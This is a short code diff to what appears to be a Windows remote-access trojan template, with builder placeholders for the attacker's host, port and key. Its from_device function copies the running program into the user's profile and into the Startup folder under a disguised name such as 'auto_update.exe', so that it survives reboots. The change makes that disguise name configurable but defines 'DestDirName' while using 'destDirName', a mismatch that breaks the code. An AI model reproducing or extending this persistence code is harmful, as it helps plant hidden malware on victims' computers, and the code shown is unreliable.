@@ -20,6 +20,7 @@ HOST = '{%ip_address%}'
 PORT = {%port_number%}
 active = False
 passKey = r'{%md5key%}'
+DestDirName = '{%working_directory%}'
 uppercase = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
 __filename__ = '{%filename%}'
 __version__ = '1.0'
@@ -131,7 +132,7 @@ updateCode = {
 
 def from_device():
     if Shell32.IsUserAnAdmin() == 1:
-        destination = os.path.join(os.path.expanduser('~'), '{%working_directory%}', 'auto_update.exe')
+        destination = os.path.join(os.path.expanduser('~'), destDirName, __filename__)
         try: shutil.copyfile(sys.argv[0], destination)
         except: pass
         PRM = SHELLEXECUTEINFO()
@@ -149,7 +150,7 @@ def from_device():
         BUFFER = ctypes.create_unicode_buffer(260)
         SHGetSpecialFolderPath.argtypes = [ctypes.c_ulong, ctypes.c_wchar_p, ctypes.c_int, ctypes.c_int]
         SHGetSpecialFolderPath(0, BUFFER, CSIDL_STARTUP, 0)
-        DESTPATH = os.path.join(BUFFER.value, 'auto_update.exe')
+        DESTPATH = os.path.join(BUFFER.value, __filename__)
         if not os.path.exists(DESTPATH):
             try:shutil.copyfile(sys.argv[0], DESTPATH)
             except: pass
